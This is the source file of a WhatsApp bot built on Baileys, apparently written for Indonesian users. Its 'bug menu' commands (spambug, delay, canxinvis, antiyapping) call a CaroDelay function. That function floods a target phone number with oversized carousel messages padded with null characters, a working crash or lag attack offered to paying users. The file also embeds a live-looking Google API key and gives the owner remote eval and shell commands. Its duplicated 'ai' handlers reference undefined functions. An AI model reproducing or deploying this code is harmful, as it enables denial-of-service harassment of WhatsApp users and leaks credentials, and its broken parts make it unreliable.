/*
Base By: Lezz DcodeR
Recode By: ZycodeX

Sosmed Creator Base:
- Tiktok Creator: https://tiktok.com/@lezzzcoder
- Github Creator: https://github.com/LezzDcodeR
- YouTube Creator: https://youtube.com/@lezzdcoder

Jangan Lupa Untuk Menyebarkan Cinta [ ♥️ ] Dengan Membiarkan Credit Ini Tetap Ada
*/

require("./nganuin")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const { exec } = require("child_process")
const path = require('path')
module.exports = async (ade, m, store) => {
try {
const from = m.key.remoteJid
const { 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto, 
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
  } = require("baileys")
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ''
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isCh = from.endsWith('@newsletter')
const isGroup = from.endsWith('@g.us')
const botNumber = await ade.decodeJid(ade.user.id)
const sender = m.key.fromMe ? (ade.user.id.split(':')[0]+'@s.whatsapp.net' || ade.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isOwner = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;

const groupMetadata = isGroup ? await ade.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const prem = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = prem.includes(m.sender)

//Fake Quoted
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Powered By Can`
}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'Powered By Lezz',jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By Lezz`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By Can`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Chansya Bot"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `Can - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By Can`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `Simple Bot By Lezz`,jpegThumbnail: ""}}}

// Reply
const replyz = (teks) => {
    return ade.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 1000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                        }
                    }
                }
            }
        }
    }, {})
}

const reply = (anu) => {
ade.sendMessage(m.chat, {
                text: anu,
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        title: "ZycodeXcan",
                        body: "ZynxZy",
                    }
                }
            }, { quoted: m })
}
// Tampilan Di Console
if (m.message) {
  console.log(
  `\n` +
  chalk.red(`[ MESSAGE ] ${m.text}`) +
  `\n` +
      chalk.yellow(`[ FROM ]: ${m.sender}`) +
      "\n" +
      chalk.green(`[ TYPE MESSAGE ]: ${m.mtype}`) +
      "\n" +
      chalk.magenta(`[ IN ]: ${m.isGroup ? "GROUP CHAT" : "PRIVATE CHAT"}`) +
      "\n"
  );
}

//Anu
const react = async (anunya) => {
            ade.sendMessage(m.chat, {
                react: {
                    text: anunya,
                    key: m.key 
                } 
            })
        };
// Gak Usah Di Apa Apain Jika Tidak Mau Error
let ppuser
try {
ppuser = await ade.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ffiqx3.png'
}

//Load Plug
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./cmd"));
        const plug = { ade, prefix, command, reply, text, isCh, isGroup: m.isGroup };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !isOwner) {
                    return m.reply(`Fitur Ini Hanya Bisa Di Gunakan Oleh Owner`);
                }
                
                if (plugin.group && !plug.isGroup) {
                    return m.reply(`Fitur Ini Hanya Bisa Di Gunakan Di Group Chat`);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;


//Function Bug
async function CaroDelay(target, count) {
let anu = count;

for (let i = 0; i < anu; i++) {
  let push = [];
  let buttt = [];

  for (let j = 0; j < 5; j++) {
    buttt.push({
      "name": "galaxy_message",
      "buttonParamsJson": JSON.stringify({
        "header": "null",
        "body": "xxx",
        "flow_action": "navigate",
        "flow_action_payload": { screen: "FORM_SCREEN" },
        "flow_cta": "Grattler",
        "flow_id": "1169834181134583",
        "flow_message_version": "3",
        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
      })
    });
  }

  for (let k = 0; k < 1000; k++) {
    push.push({
      "body": {
        "text": `\u0000\u0000\u0000\u0000\u0000`
      },
      "footer": {
        "text": "ANTI HAMA"
      },
      "header": {
        "title": '🍀‌⃕Anti Yapping\u0000\u0000\u0000\u0000',
        "hasMediaAttachment": true,
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m234/AQO1pCM6gZkA93yvvi17fFOLJumneVMbM-4fUoSIkiC5feJsQJLwkOfhsL44vzVVrJWjrmlOkt9cX5ZG9q4Nh6sGD6uNVlXrUcTrNhUPHg?ccb=9-4&oh=01_Q5Aa1QEjq2KLfy7lkPG2BvUbJ6pRKaQYmuWmDBRdYRv9_azlkg&oe=6824724B&_nc_sid=e6ed6c&mms3=true",
          "mimetype": "image/jpeg",
          "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          "fileLength": "99999",
          "height": 0,
          "width": 0,
          "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          "mediaKeyTimestamp": "1721344123",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
          "scanLengths": [
            247,
            201,
            73,
            63
          ],
          "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
        }
      },
      "nativeFlowMessage": {
        "buttons": []
      }
    });
  }

  const carousel = generateWAMessageFromContent(target, {
    "viewOnceMessage": {
      "message": {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        "interactiveMessage": {
          "body": {
            "text": '\u0000\u0000\u0000\u0000'
          },
          "footer": {
            "text": "ANTI HAMA"
          },
          "header": {
            "hasMediaAttachment": false
          },
          "carouselMessage": {
            "cards": [
              ...push
            ]
          }
        }
      }
    }
  }, {});

  await ade.relayMessage(target, carousel.message, {
    participant: { jid: target }
  });
}
}

switch (command) {
case "menu": {
let menu
menu = `
> *\`[ BOT INFORMATION ]\`*
- Bot Name: Zican
- Creator: CanImout

> *\`[ USER INFORMATION ]\`*
- User Name: ${pushname}
- User Number: ${m.sender}
- Status: ${isOwner ? "Owner" : isPremium ? "Premium User" : "Free User"}

> *\`[ BUG MENU ]\`*
- canxinvis *<number>*
- spambug *<number|amount>*
- delay *<number>*
- antiyapping *<number>*

> *\`[ OWNER MENU ]\`*
- addprem *<number>*
- delprem *<number>*
- self
- public`
await ade.sendMessage(m.chat, { text: menu }, { quoted: m})
await ade.sendMessage(m.chat, { audio: { url: "https://files.catbox.moe/ffiqx3.png" }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
}
break

case "spambug": {
if (!isPremium && !isOwner) return m.reply("Bukan Premium Ga Bisa Pake, Buy Lah Minimal")
let y = text.split("|")
if (y.length < 2) return m.reply(`Example: ${prefix + command} 628xxx|Jumlah`)
let anu = y[0]
let jumlah = y[1]
let target = anu.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await CaroDelay(target, jumlah)
await ade.sendMessage(m.chat, { image: { url: "https://files.catbox.moe/ffiqx3.png" }, caption: `*SENDING BUG INFORMATION*\n- TARGET: ${target}\n- STATUS SENDING: DONE`})
}
break

case "antiyapping": {
if (!isPremium && !isOwner) return m.reply("Bukan Premium Ga Bisa Pake, Buy Lah Minimal")
if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await CaroDelay(target, 20)
await ade.sendMessage(m.chat, { image: { url: "https://files.catbox.moe/ffiqx3.png" }, caption: `*SENDING BUG INFORMATION*\n- TARGET: ${target}\n- STATUS SENDING: DONE`})
}
break

case "delay": case "canxinvis": {
if (!isPremium && !isOwner) return m.reply("Bukan Premium Ga Bisa Pake, Buy Lah Minimal")
if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await CaroDelay(target, 10)
await ade.sendMessage(m.chat, { image: { url: "https://files.catbox.moe/ffiqx3.png" }, caption: `*SENDING BUG INFORMATION*\n- TARGET: ${target}\n- STATUS SENDING: DONE`})
}
break

case 'self': {
    if (!isOwner) return
    ade.public = false
    m.reply(`Dingin Tetapi Tidak Kejam`)
}
break

case 'coop':
  m.reply(`
> *\`[ THANKS TO ]\`*
- ALLAH SWT
- ZYCODEX
- CANSYL\n- ALL MEMBER
`,)
  break
        
case 'ai': {

  if (!text) return m.reply('Masukkan perintah!\nContoh: .ai siapa itu cansyl')

  if (/buatkan (saya )?(gambar|ilustrasi)/i.test(text)) {

    let match = text.match(/buatkan (saya )?(gambar|ilustrasi) (.+)/i)

    if (!match) return m.reply('Gambarnya apa? Contoh: .ai buatkan gambar kucing lucu')

    

    let keyword = match[3]

    m.reply('Sedang membuat gambar, tunggu sebentar...')

    try {

      let imageBuffer = await generateImageFromGemini(keyword)

      conn.sendMessage(m.chat, { image: imageBuffer, caption: `Berikut gambar "${keyword}"` }, { quoted: m })

    } catch (e) {

      m.reply(`Gagal membuat gambar: ${e.message}`)

    }

  } else {

    let result = await geminiTextReply(text)

    m.reply(result)

  }

  break

}
        
case 'public': {
    if (!isOwner) return
    ade.public = true
    m.reply(`Mode Sigma Aktif`)
}
break

case "addprem": {
    if (!isOwner) return m.reply("Khusus Owner")
    if (!args[0]) return m.reply(`Example: ${prefix+command} 628xxx`)
    prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let ceknya = await ade.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    prem.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
    m.reply(`Successfully Added ${prrkek} To Database`)
}
break

case 'ai': {
  const { GoogleGenerativeAI } = require('@google/generative-ai')
  const genAI = new GoogleGenerativeAI('AIzaSyAb1xzBcZDtcPPIMpOhqJn8I36PDgl8L2g')

  if (!q) return m.reply("Tanyakan sesuatu untuk AI (misal: ai siapa presiden pertama?)")

  // Deteksi permintaan gambar
  const isImageRequest = q.toLowerCase().includes('gambar') || q.toLowerCase().startsWith('buatkan saya gambar')

  if (isImageRequest) {
    // Pakai model Imagen
    const model = genAI.getGenerativeModel({ model: 'imagen-3.0-generate-002' })

    const result = await model.generateContent(q)
    const response = await result.response
    const imageUrl = response.candidates?.[0]?.content?.parts?.[0]?.inlineData?.data

    if (imageUrl) {
      const buffer = Buffer.from(imageUrl, 'base64')
      await conn.sendFile(m.chat, buffer, 'image.jpg', q, m)
    } else {
      m.reply("Gagal membuat gambar.")
    }

  } else {
    // Pakai model teks
    const model = genAI.getGenerativeModel({ model: 'gemini-1.5-pro' })

    const result = await model.generateContent(q)
    const response = await result.response
    const text = response.text()

    m.reply(text)
  }

  break
}

case "delprem": {
    if (!isOwner) return m.reply("Khusus Can")
    if (!args[0]) return m.reply(`Example: ${prefix+command} 628xxx`)
    ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    unp = prem.indexOf(ya)
    prem.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
    m.reply(`Successfully Removed ${ya} From Database`)
}
break

//End Case
default:
if ((budy.match) && ["babi","kntl", "kontol", "bujang", "mmq", "mmk", "memek", "iclik", "ktl", "anjing", "anj",].includes(budy)) {
m.reply(`
*مَا شَيْءٌ أَثْقَلُ فِيْ مِيْزَانِ الْمُؤْمِنِ يَوْمَ الْقِيَامَةِ مِنْ خُلُقٍ حَسَنٍ وَإِنَّ اللهَ لَيُبْغِضُ الْفَاحِشَ الْبَذِيْءَ*

_“Sesungguhnya tidak ada sesuatu apapun yang paling berat ditimbangan kebaikan seorang mu’min pada hari kiamat seperti akhlaq yang mulia, dan sungguh-sungguh (benar-benar) Allāh benci dengan orang yang lisānnya kotor dan kasar.”_

\`jangan toxic lagi ya kak\` *@${pushname}* ☺`)
}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
m.reply(`WaalaikumSalam`)
}

if (budy.startsWith('=>')) {
    if (!isOwner) return

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return m.reply(bang)
    }
    try {
        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        m.reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isOwner) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        m.reply(String(err));
    }
}

if (budy.startsWith('$')) {
    if (!isOwner) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)
    })
}

}
} catch (err) {
    console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
